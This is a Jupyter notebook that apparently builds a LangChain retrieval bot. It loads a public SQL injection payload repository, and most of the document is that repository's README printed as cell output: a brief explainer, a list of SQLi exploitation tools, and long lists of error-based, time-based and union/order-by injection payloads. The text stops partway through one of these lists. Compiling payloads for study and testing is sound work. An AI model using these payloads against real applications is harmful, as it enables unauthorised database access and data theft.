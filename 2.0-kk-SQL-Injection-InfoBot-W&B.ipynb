{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import warnings\n",
    "warnings.filterwarnings('ignore')\n",
    "\n",
    "import os\n",
    "\n",
    "from dotenv import load_dotenv, find_dotenv\n",
    "_ = load_dotenv(find_dotenv()) # read local .env file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import random\n",
    "import re\n",
    "import wandb\n",
    "from rich.markdown import Markdown\n",
    "\n",
    "from langchain.chat_models import ChatOpenAI\n",
    "from langchain.document_loaders import GitLoader\n",
    "from langchain.text_splitter import MarkdownTextSplitter\n",
    "from langchain.embeddings import OpenAIEmbeddings\n",
    "from langchain.vectorstores import Qdrant\n",
    "from langchain.prompts import PromptTemplate"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "loader = GitLoader(\n",
    "    clone_url=\"https://github.com/payloadbox/sql-injection-payload-list\",\n",
    "    repo_path=\"./github_data/sql_repo/\",\n",
    "    branch=\"master\",\n",
    "    file_filter=lambda file_path: file_path.endswith(\".md\")\n",
    ")\n",
    "\n",
    "data = loader.load()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'### SQL Injection Payload List\\r\\n\\r\\n<p align=\"center\">\\r\\n  <img src=\"https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg\"> <img src=\"https://img.shields.io/github/stars/payloadbox/sql-injection-payload-list?style=social\"> <img src=\"https://img.shields.io/github/forks/payloadbox/sql-injection-payload-list?style=social\"> <img src=\"https://img.shields.io/github/repo-size/payloadbox/sql-injection-payload-list\"> <img src=\"https://img.shields.io/github/license/payloadbox/sql-injection-payload-list\"> <img src=\"https://img.shields.io/github/issues/detail/author/payloadbox/command-injection-payload-list/1\">\\r\\n</p>\\r\\n\\r\\n#### SQL Injection\\r\\n\\r\\nIn this section, we\\'ll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection. \\r\\n\\r\\n#### What is SQL injection (SQLi)?\\r\\n\\r\\nSQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application\\'s content or behavior.\\r\\n\\r\\nIn some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.\\r\\n\\r\\n<p align=\"center\"> \\r\\n<img src=\"/Image/sql-injection.svg\">\\r\\n</p>\\r\\n\\r\\n|    SQL Injection Type        | Description                     \\r\\n|----------------|-------------------------------|\\r\\n|In-band SQLi (Classic SQLi)|In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi. |    \\r\\n|Error-based SQLi          |Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.| \\r\\n|Union-based SQLi         |Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.|\\r\\n|Inferential SQLi (Blind SQLi)|Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.|\\r\\n|Boolean-based (content-based) Blind SQLi |Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.|\\r\\n|Time-based Blind SQLi |Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. Depending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.|\\r\\n|Out-of-band SQLi|Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).|\\r\\n| Voice Based Sql Injection | It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound. |\\r\\n\\r\\n#### SQL Injection Vulnerability Scanner Tool\\'s :\\r\\n\\r\\n* [SQLMap](https://github.com/sqlmapproject/sqlmap) – Automatic SQL Injection And Database Takeover Tool\\r\\n\\r\\n* [jSQL Injection](https://github.com/ron190/jsql-injection) – Java Tool For Automatic SQL Database Injection\\r\\n\\r\\n* [BBQSQL](https://github.com/Neohapsis/bbqsql) – A Blind SQL-Injection Exploitation Tool\\r\\n\\r\\n* [NoSQLMap](https://github.com/codingo/NoSQLMap) – Automated NoSQL Database Pwnage\\r\\n\\r\\n* [Whitewidow](https://www.kitploit.com/2017/05/whitewidow-sql-vulnerability-scanner.html) – SQL Vulnerability Scanner\\r\\n\\r\\n* [DSSS](https://github.com/stamparm/DSSS) – Damn Small SQLi Scanner\\r\\n\\r\\n* [explo](https://github.com/dtag-dev-sec/explo) – Human And Machine Readable Web Vulnerability Testing Format\\r\\n\\r\\n* [Blind-Sql-Bitshifting](https://github.com/awnumar/blind-sql-bitshifting) – Blind SQL-Injection via Bitshifting\\r\\n\\r\\n* [Leviathan](https://github.com/leviathan-framework/leviathan) – Wide Range Mass Audit Toolkit\\r\\n\\r\\n* [Blisqy](https://github.com/JohnTroony/Blisqy) – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)\\r\\n\\r\\n#### Generic SQL Injection Payloads\\r\\n\\r\\n```\\r\\n\\'\\r\\n\\'\\'\\r\\n`\\r\\n``\\r\\n,\\r\\n\"\\r\\n\"\"\\r\\n/\\r\\n//\\r\\n\\\\\\r\\n\\\\\\\\\\r\\n;\\r\\n\\' or \"\\r\\n-- or # \\r\\n\\' OR \\'1\\r\\n\\' OR 1 -- -\\r\\n\" OR \"\" = \"\\r\\n\" OR 1 = 1 -- -\\r\\n\\' OR \\'\\' = \\'\\r\\n\\'=\\'\\r\\n\\'LIKE\\'\\r\\n\\'=0--+\\r\\n OR 1=1\\r\\n\\' OR \\'x\\'=\\'x\\r\\n\\' AND id IS NULL; --\\r\\n\\'\\'\\'\\'\\'\\'\\'\\'\\'\\'\\'\\'\\'UNION SELECT \\'2\\r\\n%00\\r\\n/*…*/ \\r\\n+\\t\\taddition, concatenate (or space in url)\\r\\n||\\t\\t(double pipe) concatenate\\r\\n%\\t\\twildcard attribute indicator\\r\\n\\r\\n@variable\\tlocal variable\\r\\n@@variable\\tglobal variable\\r\\n\\r\\n\\r\\n# Numeric\\r\\nAND 1\\r\\nAND 0\\r\\nAND true\\r\\nAND false\\r\\n1-false\\r\\n1-true\\r\\n1*56\\r\\n-2\\r\\n\\r\\n\\r\\n1\\' ORDER BY 1--+\\r\\n1\\' ORDER BY 2--+\\r\\n1\\' ORDER BY 3--+\\r\\n\\r\\n1\\' ORDER BY 1,2--+\\r\\n1\\' ORDER BY 1,2,3--+\\r\\n\\r\\n1\\' GROUP BY 1,2,--+\\r\\n1\\' GROUP BY 1,2,3--+\\r\\n\\' GROUP BY columnnames having 1=1 --\\r\\n\\r\\n\\r\\n-1\\' UNION SELECT 1,2,3--+\\r\\n\\' UNION SELECT sum(columnname ) from tablename --\\r\\n\\r\\n\\r\\n-1 UNION SELECT 1 INTO @,@\\r\\n-1 UNION SELECT 1 INTO @,@,@\\r\\n\\r\\n1 AND (SELECT * FROM Users) = 1\\t\\r\\n\\r\\n\\' AND MID(VERSION(),1,1) = \\'5\\';\\r\\n\\r\\n\\' and 1 in (select min(name) from sysobjects where xtype = \\'U\\' and name > \\'.\\') --\\r\\n\\r\\n\\r\\nFinding the table name\\r\\n\\r\\n\\r\\nTime-Based:\\r\\n,(select * from (select(sleep(10)))a)\\r\\n%2c(select%20*%20from%20(select(sleep(10)))a)\\r\\n\\';WAITFOR DELAY \\'0:0:30\\'--\\r\\n\\r\\nComments:\\r\\n\\r\\n#\\t    Hash comment\\r\\n/*  \\tC-style comment\\r\\n-- -\\tSQL comment\\r\\n;%00\\tNullbyte\\r\\n`\\t    Backtick\\r\\n```\\r\\n\\r\\n#### Generic Error Based Payloads\\r\\n\\r\\n```\\r\\n OR 1=1\\r\\n OR 1=0\\r\\n OR x=x\\r\\n OR x=y\\r\\n OR 1=1#\\r\\n OR 1=0#\\r\\n OR x=x#\\r\\n OR x=y#\\r\\n OR 1=1-- \\r\\n OR 1=0-- \\r\\n OR x=x-- \\r\\n OR x=y-- \\r\\n OR 3409=3409 AND (\\'pytW\\' LIKE \\'pytW\\r\\n OR 3409=3409 AND (\\'pytW\\' LIKE \\'pytY\\r\\n HAVING 1=1\\r\\n HAVING 1=0\\r\\n HAVING 1=1#\\r\\n HAVING 1=0#\\r\\n HAVING 1=1-- \\r\\n HAVING 1=0-- \\r\\n AND 1=1\\r\\n AND 1=0\\r\\n AND 1=1-- \\r\\n AND 1=0-- \\r\\n AND 1=1#\\r\\n AND 1=0#\\r\\n AND 1=1 AND \\'%\\'=\\'\\r\\n AND 1=0 AND \\'%\\'=\\'\\r\\n AND 1083=1083 AND (1427=1427\\r\\n AND 7506=9091 AND (5913=5913\\r\\n AND 1083=1083 AND (\\'1427=1427\\r\\n AND 7506=9091 AND (\\'5913=5913\\r\\n AND 7300=7300 AND \\'pKlZ\\'=\\'pKlZ\\r\\n AND 7300=7300 AND \\'pKlZ\\'=\\'pKlY\\r\\n AND 7300=7300 AND (\\'pKlZ\\'=\\'pKlZ\\r\\n AND 7300=7300 AND (\\'pKlZ\\'=\\'pKlY\\r\\n AS INJECTX WHERE 1=1 AND 1=1\\r\\n AS INJECTX WHERE 1=1 AND 1=0\\r\\n AS INJECTX WHERE 1=1 AND 1=1#\\r\\n AS INJECTX WHERE 1=1 AND 1=0#\\r\\n AS INJECTX WHERE 1=1 AND 1=1--\\r\\n AS INJECTX WHERE 1=1 AND 1=0--\\r\\n WHERE 1=1 AND 1=1\\r\\n WHERE 1=1 AND 1=0\\r\\n WHERE 1=1 AND 1=1#\\r\\n WHERE 1=1 AND 1=0#\\r\\n WHERE 1=1 AND 1=1--\\r\\n WHERE 1=1 AND 1=0--\\r\\n ORDER BY 1-- \\r\\n ORDER BY 2-- \\r\\n ORDER BY 3-- \\r\\n ORDER BY 4-- \\r\\n ORDER BY 5-- \\r\\n ORDER BY 6-- \\r\\n ORDER BY 7-- \\r\\n ORDER BY 8-- \\r\\n ORDER BY 9-- \\r\\n ORDER BY 10-- \\r\\n ORDER BY 11-- \\r\\n ORDER BY 12-- \\r\\n ORDER BY 13-- \\r\\n ORDER BY 14-- \\r\\n ORDER BY 15-- \\r\\n ORDER BY 16-- \\r\\n ORDER BY 17-- \\r\\n ORDER BY 18-- \\r\\n ORDER BY 19-- \\r\\n ORDER BY 20-- \\r\\n ORDER BY 21-- \\r\\n ORDER BY 22-- \\r\\n ORDER BY 23-- \\r\\n ORDER BY 24-- \\r\\n ORDER BY 25-- \\r\\n ORDER BY 26-- \\r\\n ORDER BY 27-- \\r\\n ORDER BY 28-- \\r\\n ORDER BY 29-- \\r\\n ORDER BY 30-- \\r\\n ORDER BY 31337-- \\r\\n ORDER BY 1# \\r\\n ORDER BY 2# \\r\\n ORDER BY 3# \\r\\n ORDER BY 4# \\r\\n ORDER BY 5# \\r\\n ORDER BY 6# \\r\\n ORDER BY 7# \\r\\n ORDER BY 8# \\r\\n ORDER BY 9# \\r\\n ORDER BY 10# \\r\\n ORDER BY 11# \\r\\n ORDER BY 12# \\r\\n ORDER BY 13# \\r\\n ORDER BY 14# \\r\\n ORDER BY 15# \\r\\n ORDER BY 16# \\r\\n ORDER BY 17# \\r\\n ORDER BY 18# \\r\\n ORDER BY 19# \\r\\n ORDER BY 20# \\r\\n ORDER BY 21# \\r\\n ORDER BY 22# \\r\\n ORDER BY 23# \\r\\n ORDER BY 24# \\r\\n ORDER BY 25# \\r\\n ORDER BY 26# \\r\\n ORDER BY 27# \\r\\n ORDER BY 28# \\r\\n ORDER BY 29# \\r\\n ORDER BY 30#\\r\\n ORDER BY 31337#\\r\\n ORDER BY 1 \\r\\n ORDER BY 2 \\r\\n ORDER BY 3 \\r\\n ORDER BY 4 \\r\\n ORDER BY 5 \\r\\n ORDER BY 6 \\r\\n ORDER BY 7 \\r\\n ORDER BY 8 \\r\\n ORDER BY 9 \\r\\n ORDER BY 10 \\r\\n ORDER BY 11 \\r\\n ORDER BY 12 \\r\\n ORDER BY 13 \\r\\n ORDER BY 14 \\r\\n ORDER BY 15 \\r\\n ORDER BY 16 \\r\\n ORDER BY 17 \\r\\n ORDER BY 18 \\r\\n ORDER BY 19 \\r\\n ORDER BY 20 \\r\\n ORDER BY 21 \\r\\n ORDER BY 22 \\r\\n ORDER BY 23 \\r\\n ORDER BY 24 \\r\\n ORDER BY 25 \\r\\n ORDER BY 26 \\r\\n ORDER BY 27 \\r\\n ORDER BY 28 \\r\\n ORDER BY 29 \\r\\n ORDER BY 30 \\r\\n ORDER BY 31337 \\r\\n RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND \\'Txws\\'=\\'\\r\\n RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND \\'Txws\\'=\\'\\r\\nIF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\\r\\nIF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\\r\\n%\\' AND 8310=8310 AND \\'%\\'=\\'\\r\\n%\\' AND 8310=8311 AND \\'%\\'=\\'\\r\\n and (select substring(@@version,1,1))=\\'X\\'\\r\\n and (select substring(@@version,1,1))=\\'M\\'\\r\\n and (select substring(@@version,2,1))=\\'i\\'\\r\\n and (select substring(@@version,2,1))=\\'y\\'\\r\\n and (select substring(@@version,3,1))=\\'c\\'\\r\\n and (select substring(@@version,3,1))=\\'S\\'\\r\\n and (select substring(@@version,3,1))=\\'X\\'\\r\\n```\\r\\n\\r\\n#### Generic Time Based SQL Injection Payloads\\r\\n\\r\\n```\\r\\n# from wapiti\\r\\nsleep(5)#\\r\\n1 or sleep(5)#\\r\\n\" or sleep(5)#\\r\\n\\' or sleep(5)#\\r\\n\" or sleep(5)=\"\\r\\n\\' or sleep(5)=\\'\\r\\n1) or sleep(5)#\\r\\n\") or sleep(5)=\"\\r\\n\\') or sleep(5)=\\'\\r\\n1)) or sleep(5)#\\r\\n\")) or sleep(5)=\"\\r\\n\\')) or sleep(5)=\\'\\r\\n;waitfor delay \\'0:0:5\\'--\\r\\n);waitfor delay \\'0:0:5\\'--\\r\\n\\';waitfor delay \\'0:0:5\\'--\\r\\n\";waitfor delay \\'0:0:5\\'--\\r\\n\\');waitfor delay \\'0:0:5\\'--\\r\\n\");waitfor delay \\'0:0:5\\'--\\r\\n));waitfor delay \\'0:0:5\\'--\\r\\n\\'));waitfor delay \\'0:0:5\\'--\\r\\n\"));waitfor delay \\'0:0:5\\'--\\r\\nbenchmark(10000000,MD5(1))#\\r\\n1 or benchmark(10000000,MD5(1))#\\r\\n\" or benchmark(10000000,MD5(1))#\\r\\n\\' or benchmark(10000000,MD5(1))#\\r\\n1) or benchmark(10000000,MD5(1))#\\r\\n\") or benchmark(10000000,MD5(1))#\\r\\n\\') or benchmark(10000000,MD5(1))#\\r\\n1)) or benchmark(10000000,MD5(1))#\\r\\n\")) or benchmark(10000000,MD5(1))#\\r\\n\\')) or benchmark(10000000,MD5(1))#\\r\\npg_sleep(5)--\\r\\n1 or pg_sleep(5)--\\r\\n\" or pg_sleep(5)--\\r\\n\\' or pg_sleep(5)--\\r\\n1) or pg_sleep(5)--\\r\\n\") or pg_sleep(5)--\\r\\n\\') or pg_sleep(5)--\\r\\n1)) or pg_sleep(5)--\\r\\n\")) or pg_sleep(5)--\\r\\n\\')) or pg_sleep(5)--\\r\\nAND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND \\'vRxe\\'=\\'vRxe\\r\\nAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND \\'%\\'=\\'\\r\\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)\\r\\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\\r\\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#\\r\\nSLEEP(5)#\\r\\nSLEEP(5)--\\r\\nSLEEP(5)=\"\\r\\nSLEEP(5)=\\'\\r\\nor SLEEP(5)\\r\\nor SLEEP(5)#\\r\\nor SLEEP(5)--\\r\\nor SLEEP(5)=\"\\r\\nor SLEEP(5)=\\'\\r\\nwaitfor delay \\'00:00:05\\'\\r\\nwaitfor delay \\'00:00:05\\'--\\r\\nwaitfor delay \\'00:00:05\\'#\\r\\nbenchmark(50000000,MD5(1))\\r\\nbenchmark(50000000,MD5(1))--\\r\\nbenchmark(50000000,MD5(1))#\\r\\nor benchmark(50000000,MD5(1))\\r\\nor benchmark(50000000,MD5(1))--\\r\\nor benchmark(50000000,MD5(1))#\\r\\npg_SLEEP(5)\\r\\npg_SLEEP(5)--\\r\\npg_SLEEP(5)#\\r\\nor pg_SLEEP(5)\\r\\nor pg_SLEEP(5)--\\r\\nor pg_SLEEP(5)#\\r\\n\\'\\\\\"\\r\\nAnD SLEEP(5)\\r\\nAnD SLEEP(5)--\\r\\nAnD SLEEP(5)#\\r\\n&&SLEEP(5)\\r\\n&&SLEEP(5)--\\r\\n&&SLEEP(5)#\\r\\n\\' AnD SLEEP(5) ANd \\'1\\r\\n\\'&&SLEEP(5)&&\\'1\\r\\nORDER BY SLEEP(5)\\r\\nORDER BY SLEEP(5)--\\r\\nORDER BY SLEEP(5)#\\r\\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)\\r\\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#\\r\\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--\\r\\n+benchmark(3200,SHA1(1))+\\'\\r\\n+ SLEEP(10) + \\'\\r\\nRANDOMBLOB(500000000/2)\\r\\nAND 2947=LIKE(\\'ABCDEFG\\',UPPER(HEX(RANDOMBLOB(500000000/2))))\\r\\nOR 2947=LIKE(\\'ABCDEFG\\',UPPER(HEX(RANDOMBLOB(500000000/2))))\\r\\nRANDOMBLOB(1000000000/2)\\r\\nAND 2947=LIKE(\\'ABCDEFG\\',UPPER(HEX(RANDOMBLOB(1000000000/2))))\\r\\nOR 2947=LIKE(\\'ABCDEFG\\',UPPER(HEX(RANDOMBLOB(1000000000/2))))\\r\\nSLEEP(1)/*\\' or SLEEP(1) or \\'\" or SLEEP(1) or \"*/\\r\\n```\\r\\n\\r\\n#### Generic Union Select Payloads\\r\\n\\r\\n```\\r\\n ORDER BY SLEEP(5)\\r\\n ORDER BY 1,SLEEP(5)\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\'))\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\\r\\n ORDER BY SLEEP(5)#\\r\\n ORDER BY 1,SLEEP(5)#\\r\\n ORDER BY 1,SLEEP(5),3#\\r\\n ORDER BY 1,SLEEP(5),3,4#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\\r\\n ORDER BY SLEEP(5)-- \\r\\n ORDER BY 1,SLEEP(5)-- \\r\\n ORDER BY 1,SLEEP(5),3-- \\r\\n ORDER BY 1,SLEEP(5),3,4-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13-- \\r\\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\\'A\\')),4,5,6,7,8,9,10,11,12,13,14-- \\r\\n ORDER BY 